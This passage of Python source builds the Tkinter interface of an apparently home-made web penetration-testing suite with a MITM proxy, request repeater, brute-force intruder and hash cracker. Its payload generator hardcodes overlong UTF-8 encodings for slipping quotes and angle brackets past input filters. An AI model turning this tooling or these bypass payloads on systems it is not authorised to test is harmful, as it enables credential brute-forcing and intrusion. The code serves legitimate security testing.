    selected = history_tree.selection()
    if not selected:
        return
    item = history_tree.item(selected[0])
    req_id = int(item['values'][0])

    with open(history_file_path, "r", encoding="utf-8") as f:
        content = f.read()
    requests = split_history_entries(content)
    if req_id <= len(requests):
        raw_req = requests[req_id - 1]
        history_text.delete("1.0", tk.END)
        history_text.insert("1.0", raw_req)
        history_text.update_idletasks()

def sort_column(tree, col, reverse):
    data_list = [(tree.set(child, col), child) for child in tree.get_children('')]
    try:
        data_list.sort(key=lambda x: int(x[0]), reverse=reverse)
    except ValueError:
        data_list.sort(reverse=reverse)
    for index, (val, child) in enumerate(data_list):
        tree.move(child, '', index)
    tree.heading(col, command=lambda: sort_column(tree, col, not reverse))

def auto_format_request():
    req = intruder_text.get("1.0", tk.END).strip()
    formatted_req = http_utils.format_http_request(req)
    intruder_text.delete("1.0", tk.END)
    intruder_text.insert("1.0", formatted_req)

def open_payload_generator(target_entry, list_id):
    gen_win = tk.Toplevel(app)
    gen_win.title("Payload Generator")
    gen_win.geometry("400x350")

    tk.Label(gen_win, text="Payload Type:").pack(pady=5)
    gen_type = tk.StringVar(value="Numbers")
    type_menu = ttk.Combobox(gen_win, textvariable=gen_type, values=["Numbers", "Brute Force"], state="readonly")
    type_menu.pack(pady=5)

    block_frame = tk.Frame(gen_win)
    tk.Label(block_frame, text="Base Character:").grid(row=0, column=0)
    base_char = tk.Entry(block_frame, width=5)
    base_char.insert(0, "A")
    base_char.grid(row=0, column=1)

    tk.Label(block_frame, text="Min Count:").grid(row=1, column=0)
    min_count = tk.Entry(block_frame, width=10)
    min_count.insert(0, "1")
    min_count.grid(row=1, column=1)

    tk.Label(block_frame, text="Max Count:").grid(row=2, column=0)
    max_count = tk.Entry(block_frame, width=10)
    max_count.insert(0, "10")
    max_count.grid(row=2, column=1)

    num_frame = tk.Frame(gen_win)
    tk.Label(num_frame, text="From:").grid(row=0, column=0)
    start_num = tk.Entry(num_frame, width=10)
    start_num.insert(0, "1")
    start_num.grid(row=0, column=1)

    tk.Label(num_frame, text="To:").grid(row=1, column=0)
    end_num = tk.Entry(num_frame, width=10)
    end_num.insert(0, "100")
    end_num.grid(row=1, column=1)

    tk.Label(num_frame, text="Step:").grid(row=2, column=0)
    step_num = tk.Entry(num_frame, width=10)
    step_num.insert(0, "1")
    step_num.grid(row=2, column=1)

    brute_frame = tk.Frame(gen_win)
    tk.Label(brute_frame, text="Charset:").grid(row=0, column=0)
    charset_entry = tk.Entry(brute_frame, width=30)
    charset_entry.insert(0, "abcdefghijklmnopqrstuvwxyz0123456789")
    charset_entry.grid(row=0, column=1)

    type_menu = ttk.Combobox(gen_win, textvariable=gen_type, values=["Numbers", "Brute Force", "Character Blocks", "Bypass/UTF-8"], state="readonly")
    type_menu.pack(pady=5)

    bypass_frame = tk.Frame(gen_win)
    tk.Label(bypass_frame, text="Character to Bypass:").grid(row=0, column=0)
    bypass_char = tk.Entry(bypass_frame, width=5)
    bypass_char.insert(0, "'")
    bypass_char.grid(row=0, column=1)

    def fill_full_ascii():
        printable_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ "
        charset_entry.delete(0, tk.END)
        charset_entry.insert(0, printable_chars)

    tk.Button(brute_frame, text="Full ASCII", command=fill_full_ascii).grid(row=0, column=2, padx=5)

    tk.Label(brute_frame, text="Min Length:").grid(row=1, column=0)
    min_len = tk.Entry(brute_frame, width=5)
    min_len.insert(0, "1")
    min_len.grid(row=1, column=1)

    tk.Label(brute_frame, text="Max Length:").grid(row=2, column=0)
    max_len = tk.Entry(brute_frame, width=5)
    max_len.insert(0, "3")
    max_len.grid(row=2, column=1)

    def toggle_frames(event=None):
        num_frame.pack_forget()
        brute_frame.pack_forget()
        block_frame.pack_forget()
        if gen_type.get() == "Numbers":
            num_frame.pack(pady=10)
        elif gen_type.get() =="Brute Force":
            brute_frame.pack(pady=10)
        elif gen_type.get() == "Character Blocks":
            block_frame.pack(pady=10)
        else:
            bypass_frame.pack(pady=10)


    type_menu.bind("<<ComboboxSelected>>", toggle_frames)
    toggle_frames()

    import itertools

    def run_gen():
        payloads = []
        if gen_type.get() == "Numbers":
            s = int(start_num.get())
            e = int(end_num.get())
            step = int(step_num.get())
            payloads = [str(i) for i in range(s, e + 1, step)]
        elif gen_type.get() == "Brute Force":
            chars = charset_entry.get()
            low = int(min_len.get())
            high = int(max_len.get())
            for length in range(low, high + 1):
                for item in itertools.product(chars, repeat=length):
                    payloads.append("".join(item))
        elif gen_type.get() == "Bypass/UTF-8":
            char = bypass_char.get()
            if char == "'":
                payloads = ["%C0%A7", "%E0%80%A7", "%F0%80%80%A7"]
            elif char == "\"":
                payloads = ["%C0%A2", "%E0%80%A2", "%F0%80%80%A2"]
            elif char == "<":
                payloads = ["%C0%BC", "%E0%80%BC", "%F0%80%80%BC"]
            else:
                payloads = [f"No preset for {char}"]
        else:
            char = base_char.get()
            low = int(min_count.get())
            high = int(max_count.get())
            for count in range(low, high + 1):
                payloads.append(char * count)
        file_name = f"gen_payloads_{list_id}.txt"
        file_path = os.path.join(os.getcwd(), file_name).replace('\\', '/')
        with open(file_path, "w") as f:
            f.write("\n".join(payloads))
        
        target_entry.delete(0, tk.END)
        target_entry.insert(0, file_path)
        gen_win.destroy()

    tk.Button(gen_win, text="Generate & Apply", bg="green", fg="white", command=run_gen).pack(pady=20)

def start_intruder_attack():
    if intruder_attack_btn.cget('text') == 'Stop Attack':
        intruder_engine.stop_attack()
        intruder_attack_btn.config(text="Start Attack", bg="darkred")
        progress_var.set(0)
        return

    for item in intruder_results.get_children():
        intruder_results.delete(item)
        intruder_response_db.clear()
    host = intruder_host.get().strip()
    port = intruder_port.get().strip()
    template = intruder_text.get("1.0", tk.END).strip()
    wordlist_path = intruder_wordlist.get().strip()
    wordlist2_path = intruder_wordlist2.get().strip()
    attack_type = attack_type_var.get()
    match_str = intruder_match.get().strip()
    rule1 = [rule1_var.get(), rule1_sec_var.get()]
    rule2 = [rule2_var.get(), rule2_sec_var.get()]
    try:
        delay_ms = int(intruder_delay.get().strip())
    except ValueError:
        delay_ms = 0
    try:
        target_threads = int(intruder_threads.get().strip())
    except ValueError:
        target_threads = 10
    macro_req_val = intruder_macro_req.get("1.0", tk.END).strip()
    macro_reg_val = intruder_macro_reg.get().strip()
    progress_var.set(0)

    intruder_attack_btn.config(text="Stop Attack", bg="#b22222")

    def _run():
        intruder_engine.run_attack_loop(
            host, port, template, attack_type, wordlist_path, wordlist2_path,
            match_str, progress_var, rule1, rule2, delay_ms,
            macro_req_val, macro_reg_val, target_threads
        )
        app.after(0, lambda: intruder_attack_btn.config(text="Start Attack", bg="darkred"))

    attack_thread = threading.Thread(target=_run, daemon=True)
    attack_thread.start()

def view_intruder_response(event):
    selected_resp = intruder_results.selection()
    if not selected_resp:
        return
    item_id = selected_resp[0]
    full_text = intruder_response_db.get(item_id, "Response data not found")
    intruder_response_text.delete("1.0", tk.END)
    intruder_response_text.insert(tk.END, full_text)
    intruder_bottom_notebook.select(response_tab)

def search_intruder_response():
    intruder_response_text.tag_remove("match", "1.0", tk.END)
    search_query = intruder_search_entry.get().strip()
    if not search_query:
        return
    start_pos = "1.0"
    while True:
        start_pos = intruder_response_text.search(search_query, start_pos, stopindex=tk.END)
        if not start_pos:
            break
        end_pos = f"{start_pos}+{len(search_query)}c"
        intruder_response_text.tag_add("match", start_pos, end_pos)
        start_pos = end_pos
    intruder_response_text.tag_config("match", background="yellow", foreground="black")

def send_to_intruder(source_widget=None):
    try:
        if source_widget is None:
            source_widget = history_text
        captured_request = source_widget.get(tk.SEL_FIRST, tk.SEL_LAST)
        intruder_text.delete("1.0", tk.END)
        intruder_text.insert(tk.END, captured_request)
        for line in captured_request.split('\n'):
            if line.strip().lower().startswith("host:"):
                target = line.split(':', 1)[1].strip()
                if ':' in target:
                    host_only = target.split(':')[0]
                    port_only = target.split(':')[1]
                    intruder_host.delete(0, tk.END)
                    intruder_host.insert(0, host_only)
                    intruder_port.delete(0, tk.END)
                    intruder_port.insert(0, port_only)
                else:
                    intruder_host.delete(0, tk.END)
                    intruder_host.insert(0, target)
                    intruder_port.delete(0, tk.END)
                    intruder_port.insert(0, "443")
                break
        tab_control.select(intruder_tab)
    except tk.TclError:
        print('[-] Whoops! Please highlight a request in the history first')

def quick_url_encode(event):
    widget = event.widget
    try:
        start = widget.index("sel.first")
        end = widget.index("sel.last")
        raw_text = widget.get(start, end)
        encoded_text = parse.quote(raw_text, safe='/^')
        widget.delete(start, end)
        widget.insert(start, encoded_text)
    except tk.TclError:
        pass
    return "break"

def quick_url_decode(event):
    widget = event.widget
    try:
        start = widget.index("sel.first")
        end = widget.index("sel.last")
        raw_text = widget.get(start, end)
        
        decoded_text = parse.unquote(raw_text)
        
        widget.delete(start, end)
        widget.insert(start, decoded_text)
    except tk.TclError:
        pass
    return "break"

def quick_b64_encode(event):
    widget = event.widget
    try:
        start = widget.index("sel.first")
        end = widget.index("sel.last")
        raw_text = widget.get(start, end)
        encoded_text = decoder_engine.encode_base64(raw_text)
        widget.delete(start, end)
        widget.insert(start, encoded_text)
    except tk.TclError:
        pass
    return "break"

def quick_b64_decode(event):
    widget = event.widget
    try:
        start = widget.index("sel.first")
        end = widget.index("sel.last")
        raw_text = widget.get(start, end)
        decoded_text = decoder_engine.decode_base64(raw_text)
        widget.delete(start, end)
        widget.insert(start, decoded_text)
    except tk.TclError:
        pass
    return "break"

def quick_html_encode(event):
    widget = event.widget
    try:
        start = widget.index("sel.first")
        end = widget.index("sel.last")
        raw_text = widget.get(start, end)
        encoded_text = decoder_engine.encode_html(raw_text)
        widget.delete(start, end)
        widget.insert(start, encoded_text)
    except tk.TclError:
        pass
    return "break"

def quick_html_decode(event):
    widget = event.widget
    try:
        start = widget.index("sel.first")
        end = widget.index("sel.last")
        raw_text = widget.get(start, end)
        decoded_text = decoder_engine.decode_html(raw_text)
        widget.delete(start, end)
        widget.insert(start, decoded_text)
    except tk.TclError:
        pass
    return "break"

def send_to_decoder(source_widget=None):
    try:
        if source_widget is None:
            source_widget = history_text
        captured_text = source_widget.get(tk.SEL_FIRST, tk.SEL_LAST)
        decoder_input.delete("1.0", tk.END)
        decoder_input.insert(tk.END, captured_text)
        tab_control.select(decoder_tab)
    except tk.TclError:
        print('[-] Whoops! Please highlight text to decode first')

def send_to_cracker(source_widget=None):
    try:
        if source_widget is None:
            source_widget = history_text
        captured_text = source_widget.get(tk.SEL_FIRST, tk.SEL_LAST)
        cracker_hash_entry.delete(0, tk.END)
        cracker_hash_entry.insert(0, captured_text)
        tab_control.select(cracker_tab)
    except tk.TclError:
        print('[-] Whoops! Please highlight a hash to crack first')

def send_to_repeater(source_widget=None):
    try:
        if source_widget is None:
            source_widget = history_text
        captured_request = source_widget.get(tk.SEL_FIRST, tk.SEL_LAST)
        repeater_text.delete("1.0", tk.END)
        repeater_text.insert(tk.END, captured_request)
        tab_control.select(repeater_tab)
    except tk.TclError:
        print('Whoops! Please highlight your selection')

def send_to_ai(source_widget=None):
    try:
        if source_widget is None:
            source_widget = history_text
        ai_request = source_widget.get(tk.SEL_FIRST, tk.SEL_LAST)
        target = "Unknown"
        for line in ai_request.split('\n'):
            if line.lower().startswith("host"):
                target = line.split(':', 1)[1].strip()
                break
        ai_engine.event_queue.put({"event": "manual_analysis",
                                    "target": target, 
                                    "payload": ai_request
                                    })
        tab_control.select(ai_tab)
    except tk.TclError:
        print("Whoops! Please highlight your selection first.")

def browse_wordlist():
    file_path = filedialog.askopenfilename(title="Select Wordlist")
    if file_path:
        intruder_wordlist.delete(0, tk.END)
        intruder_wordlist.insert(0, file_path)

def browse_wordlist2():
    file_path = filedialog.askopenfilename(title="Select Wordlist 2")
    if file_path:
        intruder_wordlist2.delete(0, tk.END)
        intruder_wordlist2.insert(0, file_path)

def browse_cracker_wordlist():
    file_path = filedialog.askopenfilename(title="Select Dictionary")
    if file_path:
        cracker_wordlist_entry.delete(0, tk.END)
        cracker_wordlist_entry.insert(0, file_path)

def start_cracker_attack():
    target_hash = cracker_hash_entry.get().strip()
    wordlist_path = cracker_wordlist_entry.get().strip()
    if not target_hash or not wordlist_path:
        cracker_result_label.config(text="Error: Missing Hash or Wordlist", fg="red")
        return
    cracker_result_label.config(text="Cracking... Please wait", fg="blue")
    cracker_attack_btn.config(state="disabled")

    def worker():
        try:
            result, algorithm = cracker_engine.crack_hash(target_hash, wordlist_path)
            if result:
                app.after(0, lambda: cracker_result_label.config(text=f"Password Found ({algorithm.upper()}): {result}", fg="green"))
            else:
                app.after(0, lambda: cracker_result_label.config(text=f"Password not found in dictionary ({algorithm.upper()})", fg="red"))
        except Exception as e:
            app.after(0, lambda: cracker_result_label.config(text=f"Error: {e}", fg="red"))
        finally:
            app.after(0, lambda: cracker_attack_btn.config(state="normal"))

    threading.Thread(target=worker, daemon=True).start()   

def clear_history():
    for item in history_tree.get_children():
        history_tree.delete(item)
    history_text.delete("1.0", tk.END)
    logger_engine.clear_log(history_file_path)

def auto_format_history():
    req = history_text.get("1.0", tk.END)
    cleaned_req =http_utils.format_history_text(req)
    history_text.delete("1.0", tk.END)
    history_text.insert("1.0", cleaned_req + "\n\n")

def set_target_scope(event=None):
    global active_scope
    active_scope = scope_entry.get().strip()
    mitm_proxy.set_scope(active_scope)
    print(f"[*] Target scope locked to: {active_scope}")
    scope_entry.config(bg="lightyellow")
    app.after(300,lambda: scope_entry.config(bg="white"))

def load_initial_history():
    refresh_history()

def check_for_new_traffic():
    try:
        while True:
            new_request = mitm_proxy.log_queue.get_nowait()
            formatted_entry = new_request + "\n==========\n"
            logger_engine.append_log(history_file_path, formatted_entry)
            method, host = parse_history_request_summary(new_request)
            req_id = len(history_tree.get_children()) + 1
            history_tree.insert('', 'end', values=(req_id, method, host, len(new_request)))
    except queue.Empty:
        pass

    app.after(250, check_for_new_traffic)

def check_intercept_queue():
    try:
        while True:
            intercepted_req = mitm_proxy.intercept_queue.get_nowait()
            intercept_text.delete("1.0", tk.END)
            intercept_text.insert(tk.END, intercepted_req)
            print("[*] GUI successfully loaded intercepted traffic")
    except queue.Empty:
        pass
    except Exception as e:
        print(f"[-] FATAL GUI ERROR in Intercept Loop: {e}")

    app.after(250, check_intercept_queue)

def check_intruder_queue():
    try:
        while True:
            result_data = intruder_engine.result_queue.get_nowait()
            display_values = result_data[:6] + (result_data[7],)
            full_text = result_data[6]
            tag = 'skimmer_hit' if result_data[7] not in ["None", "N/A"] else ''
            item_id = intruder_results.insert('', 'end', values=display_values, tags=(tag,))
            intruder_response_db[item_id] = full_text
    except queue.Empty:
        pass
    except Exception as e:
        print(f"[-] FATAL GUI ERROR in Intruder Loop: {e}")

    app.after(100, check_intruder_queue)

def search_repeater_response():
    response_text.tag_remove("match", "1.0", tk.END)
    search_query = repeater_search_entry.get().strip()
    if not search_query:
        return
    start_pos = "1.0"
    while True:
        start_pos = response_text.search(search_query, start_pos, stopindex=tk.END)
        if not start_pos:
            break
        end_pos = f"{start_pos}+{len(search_query)}c"
        response_text.tag_add("match", start_pos, end_pos)
        start_pos = end_pos
        response_text.tag_config("match", background="yellow", foreground="black")

def fire_payload():
    raw_request = repeater_text.get("1.0", tk.END).strip()
    result = repeater_engine.send_request(raw_request)
    response_text.delete("1.0", tk.END)
    response_text.insert(tk.END, result)
    search_repeater_response()

history_label = tk.Label(history_tab, text="Intercepted Traffic", font=("Arial",12))
history_label.pack(pady=5)

scope_frame = tk.Frame(history_tab)
scope_frame.pack(pady=5)

scope_label = tk.Label(scope_frame, text="Target Scope (IP/Domain):", font=("Arial", 10))
scope_label.pack(side=tk.LEFT, padx=5)

scope_entry = tk.Entry(scope_frame, width=30, font=("Arial", 10))
scope_entry.pack(side=tk.LEFT, padx=5)

scope_entry.bind('<Return>', set_target_scope)

scope_btn = tk.Button(scope_frame, text="Set Scope", bg="lightgreen", command=set_target_scope)
scope_btn.pack(side=tk.LEFT, padx=5)

history_tree = ttk.Treeview(history_tab, columns=('ID', 'Method', 'Host', 'Length'), show='headings', height=6)
history_tree.heading('ID', text='ID')
history_tree.heading('Method', text='Method')
history_tree.heading('Host', text='Host')
history_tree.heading('Length', text='Length')

history_tree.column('ID', width=50, anchor='center')
history_tree.column('Method', width=100, anchor='center')
history_tree.column('Host', width=400, anchor='w')
history_tree.column('Length', width=100, anchor='center')

history_tree.pack(fill='x', padx=10, pady=5)
history_tree.bind("<<TreeviewSelect>>", view_request)

refresh_btn = tk.Button(history_tab, text="Refresh History", bg="darkblue", fg="white", font=("Arial", 9), command=refresh_history)
refresh_btn.pack(pady=5)

global_check = tk.Checkbutton(history_tab, text="Listen Globally (Docker/LAN)", variable=listen_global_var, font=("Arial", 9))
global_check.pack(pady=2)

proxy_btn = tk.Button(history_tab, text="Start MITM Proxy", bg="darkred", fg="white", font=("Arial", 9, "bold"), command=launch_proxy_thread)
proxy_btn.pack(pady=5)

history_text_frame = tk.Frame(history_tab)
history_text_frame.pack(fill='both', expand=True, padx=10, pady=5)

history_scroll = tk.Scrollbar(history_text_frame)
history_scroll.pack(side=tk.RIGHT, fill=tk.Y)

history_text = tk.Text(history_text_frame, height=15, yscrollcommand=history_scroll.set)
history_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

history_scroll.config(command=history_text.yview)

history_btn_frame = tk.Frame(history_tab)
history_btn_frame.pack(fill='x', pady=5, padx=10)

send_btn = tk.Button(history_btn_frame, text="Send to Repeater -->", bg="blue", fg="white", font=("Arial", 12), command=send_to_repeater)
send_btn.grid(row=0, column=0, padx=10)

clear_btn = tk.Button(history_btn_frame, text="Clear History", bg="darkgray", font=("Arial", 12), command=clear_history)
clear_btn.grid(row=0, column=1, padx=10)

intruder_send_btn = tk.Button(history_btn_frame, text="Send to Intruder -->", bg="purple", fg="white", font=("Arial", 12), command=send_to_intruder)
intruder_send_btn.grid(row=0, column=2, padx=10)

format_history_btn = tk.Button(history_btn_frame, text="Format Request", bg="darkorange", font=("Arial", 12), command=auto_format_history)
format_history_btn.grid(row=0, column=3, padx=10)

filter_frame = tk.Frame(intercept_tab)
filter_frame.pack(pady=5)

get_var = tk.BooleanVar(value=False)
post_var = tk.BooleanVar(value=False)
put_var = tk.BooleanVar(value=False)
patch_var = tk.BooleanVar(value=False)
delete_var = tk.BooleanVar(value=False)
options_var = tk.BooleanVar(value=False)

def update_methods():
    interceptor_engine.target_methods["GET"] = get_var.get()
    interceptor_engine.target_methods["POST"] = post_var.get()
    interceptor_engine.target_methods["PUT"] = put_var.get()
    interceptor_engine.target_methods["PATCH"] = patch_var.get()
    interceptor_engine.target_methods["DELETE"] = delete_var.get()
    interceptor_engine.target_methods["OPTIONS"] = options_var.get()

get_check = tk.Checkbutton(filter_frame, text="GET", variable=get_var, command=update_methods)
get_check.pack(side=tk.LEFT, padx=5)

post_check = tk.Checkbutton(filter_frame, text="POST", variable=post_var, command=update_methods)
post_check.pack(side=tk.LEFT, padx=5)

put_check = tk.Checkbutton(filter_frame, text="PUT", variable=put_var, command=update_methods)
put_check.pack(side=tk.LEFT, padx=5)

patch_check = tk.Checkbutton(filter_frame, text="PATCH", variable=patch_var, command=update_methods)
patch_check.pack(side=tk.LEFT, padx=5)

delete_check = tk.Checkbutton(filter_frame, text="DELETE", variable=delete_var, command=update_methods)
delete_check.pack(side=tk.LEFT, padx=5)

options_check = tk.Checkbutton(filter_frame, text="OPTIONS", variable=options_var, command=update_methods)
options_check.pack(side=tk.LEFT, padx=5)

tk.Label(filter_frame, text="Path Scope:").pack(side=tk.LEFT)

path_entry = tk.Entry(filter_frame, width=20)
path_entry.pack(side=tk.LEFT, padx=5)

def update_path(event):
    interceptor_engine.target_path = path_entry.get().strip()

path_entry.bind("<KeyRelease>", update_path)

intercept_btn_frame = tk.Frame(intercept_tab)
intercept_btn_frame.pack(pady=10)

intercept_btn = tk.Button(intercept_btn_frame, text="Intercept is OFF", bg="lightgray", command=toggle_intercept)
intercept_btn.grid(row=0, column=0, padx=10)

forward_btn = tk.Button(intercept_btn_frame, text="Forward Request", bg="green", fg="white", command=forward_request)
forward_btn.grid(row=0, column=1, padx=10)

drop_btn = tk.Button(intercept_btn_frame, text="Drop Request", bg="red", fg="white", command=drop_request)
drop_btn.grid(row=0, column=2, padx=10)

intercept_text_frame = tk.Frame(intercept_tab)
intercept_text_frame.pack(fill='both', expand=True, padx=10, pady=5)

intercept_scroll = tk.Scrollbar(intercept_text_frame)
intercept_scroll.pack(side=tk.RIGHT, fill=tk.Y)

intercept_text = tk.Text(intercept_text_frame, height=20, yscrollcommand=intercept_scroll.set)
intercept_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
intercept_scroll.config(command=intercept_text.yview)

repeater_label = tk.Label(repeater_tab, text="Ready to Modify and Fire", font=("Arial", 12))
repeater_label.pack(pady=5)

repeater_text_frame = tk.Frame(repeater_tab)
repeater_text_frame.pack(fill='both', expand=True, padx=10, pady=5)

repeater_scroll = tk.Scrollbar(repeater_text_frame)
repeater_scroll.pack(side=tk.RIGHT, fill=tk.Y)

repeater_text = tk.Text(repeater_text_frame, height=20, yscrollcommand=repeater_scroll.set)
repeater_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

repeater_scroll.config(command=repeater_text.yview)

repeater_btn = tk.Button(repeater_tab, text="Fire Payload", bg="darkred", fg="white", font=("Arial", 12), command=fire_payload)
repeater_btn.pack(pady=15)

response_label = tk.Label(repeater_tab, text="Server Response:", font=("Arial", 12))
response_label.pack(pady=5)

repeater_search_frame = tk.Frame(repeater_tab)
repeater_search_frame.pack(pady=2)

tk.Label(repeater_search_frame, text="Find:").pack(side=tk.LEFT)
repeater_search_entry = tk.Entry(repeater_search_frame, width=30)
repeater_search_entry.pack(side=tk.LEFT, padx=5)

repeater_search_entry.bind("<Return>", lambda e: search_repeater_response())

search_btn = tk.Button(repeater_search_frame, text="Match", command=search_repeater_response)
search_btn.pack(side=tk.LEFT)

response_text_frame = tk.Frame(repeater_tab)
response_text_frame.pack(fill='both', expand=True, padx=10, pady=5)

response_scroll = tk.Scrollbar(response_text_frame)
response_scroll.pack(side=tk.RIGHT, fill=tk.Y)

response_text = tk.Text(response_text_frame, height=15, yscrollcommand=response_scroll.set)
response_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

response_scroll.config(command=response_text.yview)

intruder_target_frame = tk.Frame(intruder_tab)
intruder_target_frame.pack(pady=5)

tk.Label(intruder_target_frame, text="Target Host:", font=("Arial", 10)).pack(side=tk.LEFT)
intruder_host = tk.Entry(intruder_target_frame, width=30)
intruder_host.pack(side=tk.LEFT, padx=5)

tk.Label(intruder_target_frame, text="Port", font=("Arial", 10)).pack(side=tk.LEFT)
intruder_port = tk.Entry(intruder_target_frame, width=8)
intruder_port.insert(0, "80")
intruder_port.pack(side=tk.LEFT, padx=5)

tk.Label(intruder_tab, text="Request Template (Use ^ to mark payload injection points)", font=("Arial", 12)).pack(pady=5)

intruder_text_frame = tk.Frame(intruder_tab)
intruder_text_frame.pack()

intruder_scroll = tk.Scrollbar(intruder_text_frame)
intruder_scroll.pack(side=tk.RIGHT, fill=tk.Y)

intruder_text = tk.Text(intruder_text_frame, height=12, width=88, yscrollcommand=intruder_scroll.set)
intruder_text.pack(side=tk.LEFT, fill=tk.BOTH)
intruder_scroll.config(command=intruder_text.yview)

intruder_payload_frame = tk.Frame(intruder_tab)
intruder_payload_frame.pack(pady=10)

tk.Label(intruder_payload_frame, text="Attack Type:", font=("Arial", 10)).grid(row=0, column=0, sticky="e", pady=2)
attack_type_var = tk.StringVar(value="Sniper")
attack_dropdown = ttk.Combobox(intruder_payload_frame, textvariable=attack_type_var, values=["Sniper", "Pitchfork", "Cluster Bomb"], state="readonly", width=15)
attack_dropdown.grid(row=0, column=1, sticky="w", padx=5, pady=2)

tk.Label(intruder_payload_frame, text="Wordlist 1 (^1^):", font=("Arial",10)).grid(row=1, column=0, sticky="e", pady=2)
intruder_wordlist = tk.Entry(intruder_payload_frame, width=40)
intruder_wordlist.grid(row=1, column=1, padx=5, pady=2)
intruder_browse_btn = tk.Button(intruder_payload_frame, text="Browse...", command=browse_wordlist)
intruder_browse_btn.grid(row=1, column=2, padx=5)
intruder_gen_btn1 = tk.Button(intruder_payload_frame, text="Gen", bg="#2ECC71", fg="white", font=("Arial", 9, "bold"), width=6, command=lambda: open_payload_generator(intruder_wordlist, 1))
intruder_gen_btn1.grid(row=1, column=3, padx=(0, 15), sticky="w")

rule1_var = tk.StringVar(value="None")
rule1_dropdown = ttk.Combobox(intruder_payload_frame, textvariable=rule1_var, values=["None", "Base64 Encode", "Base64 Decode", "MD5 Hash", "SHA-1 Hash", "SHA-256 Hash", "URL Encode", "URL Decode", "HTML Encode", "HTML Decode", "ASCII Encode", "SQL Hex", "JSON Encode", "Double URL Encode", "URL Encode All"], state="readonly", width=15)
rule1_dropdown.grid(row=1, column=4, padx=5)

rule1_sec_var = tk.StringVar(value="None")
rule1_sec_dropdown = ttk.Combobox(intruder_payload_frame, textvariable=rule1_sec_var, values=rule1_dropdown['values'], state="readonly", width=15)
rule1_sec_dropdown.grid(row=1, column=5, padx=5)

tk.Label(intruder_payload_frame, text="Wordlist 2 (^2^):", font=("Arial",10)).grid(row=2, column=0, sticky="e", pady=2)
intruder_wordlist2 = tk.Entry(intruder_payload_frame, width=40)
intruder_wordlist2.grid(row=2, column=1, padx=5, pady=2)
intruder_browse_btn = tk.Button(intruder_payload_frame, text="Browse...", command=browse_wordlist2)
intruder_browse_btn.grid(row=2, column=2, padx=5)
intruder_gen_btn2 = tk.Button(intruder_payload_frame, text="Gen", bg="#2ECC71", fg="white", font=("Arial", 9, "bold"), width=6, command=lambda: open_payload_generator(intruder_wordlist2, 2))
intruder_gen_btn2.grid(row=2, column=3, padx=(0, 15), sticky="w")

rule2_var = tk.StringVar(value="None")
rule2_dropdown = ttk.Combobox(intruder_payload_frame, textvariable=rule2_var, values=["None", "Base64 Encode", "Base64 Decode", "MD5 Hash", "SHA-1 Hash", "SHA-256 Hash", "URL Encode", "URL Decode", "HTML Encode", "HTML Decode", "ASCII Encode", "SQL Hex", "JSON Encode", "Double URL Encode", "URL Encode All"], state="readonly", width=15)
rule2_dropdown.grid(row=2, column=4, padx=5)

rule2_sec_var = tk.StringVar(value="None")
rule2_sec_dropdown = ttk.Combobox(intruder_payload_frame, textvariable=rule2_sec_var, values=rule2_dropdown['values'], state="readonly", width=15)
rule2_sec_dropdown.grid(row=2, column=5, padx=5)

tk.Label(intruder_payload_frame, text="Match String:", font=("Arial", 10)).grid(row=3, column=0, sticky="e", pady=2)
intruder_match = tk.Entry(intruder_payload_frame, width=40)
intruder_match.grid(row=3, column=1, padx=5, pady=2)

tk.Label(intruder_payload_frame, text="Delay (ms):", font=("Arial", 10)).grid(row=4, column=0, sticky="e", pady=2)
intruder_delay = tk.Entry(intruder_payload_frame, width=15)
intruder_delay.insert(0, "0")
intruder_delay.grid(row=4, column=1, sticky="w", padx=5, pady=2)

tk.Label(intruder_payload_frame, text="Threads", font=("Arial", 10)).grid(row=4, column=2, sticky="e", pady=2)
intruder_threads = tk.Entry(intruder_payload_frame, width=8)
intruder_threads.insert(0, "10")
intruder_threads.grid(row=4, column=3, sticky="w")

tk.Label(intruder_payload_frame, text="Macro Setup Request:", font=("Arial", 10)).grid(row=5, column=0, sticky="ne", pady=2)
intruder_macro_req = tk.Text(intruder_payload_frame, height=4, width=55, font=("Courier", 8))
intruder_macro_req.grid(row=5, column=1, columnspan=2, sticky="w", padx=5, pady=2)

tk.Label(intruder_payload_frame, text="Macro Regex:", font=("Arial", 10)).grid(row=6, column=0, sticky="e", pady=2)
intruder_macro_reg = tk.Entry(intruder_payload_frame, width=40)
intruder_macro_reg.grid(row=6, column=1, sticky="w", padx=5, pady=2)

format_btn = tk.Button(intruder_payload_frame, text="Auto-Format", bg="darkblue", fg="white", font=("Arial", 9),  command=auto_format_request)
format_btn.grid(row=0, column=6, padx=15, sticky="ew")

intruder_attack_btn = tk.Button(intruder_payload_frame, text="Start Attack", bg="darkred", fg="white", font=("Arial", 10, "bold"), command=start_intruder_attack)
intruder_attack_btn.grid(row=1, column=6, rowspan=2, padx=15, sticky="ns")

progress_var = tk.DoubleVar()
attack_progress = ttk.Progressbar(intruder_tab, variable=progress_var, maximum=100)
attack_progress.pack(fill='x', padx=20, pady=5)

intruder_bottom_notebook = ttk.Notebook(intruder_tab)
intruder_bottom_notebook.pack(pady=5, fill=tk.BOTH, expand=True)

results_tab = tk.Frame(intruder_bottom_notebook)
response_tab = tk.Frame(intruder_bottom_notebook)

intruder_bottom_notebook.add(results_tab, text="Results Table")
intruder_bottom_notebook.add(response_tab, text="Raw Response")

tree_y_scroll = tk.Scrollbar(results_tab)
tree_y_scroll.pack(side=tk.RIGHT, fill=tk.Y)
    
tree_x_scroll = tk.Scrollbar(results_tab, orient=tk.HORIZONTAL)
tree_x_scroll.pack(side=tk.BOTTOM, fill=tk.X)

columns = ('Payload', 'Status', 'Length', 'Time', 'Location', 'Match', 'Skimmer Hits')
intruder_results = ttk.Treeview(results_tab, columns=columns, show='headings', height=10, yscrollcommand=tree_y_scroll.set, xscrollcommand=tree_x_scroll.set)

tree_y_scroll.config(command=intruder_results.yview)
tree_x_scroll.config(command=intruder_results.xview)

intruder_results.heading('Payload', text='Payload', command=lambda: sort_column(intruder_results, 'Payload', False))
intruder_results.heading('Status', text='Status Code', command=lambda: sort_column(intruder_results, 'Status', False))
intruder_results.heading('Length', text='Response Length', command=lambda: sort_column(intruder_results, 'Length', False))
intruder_results.heading('Time', text='Time (ms)', command=lambda: sort_column(intruder_results, 'Time', False))
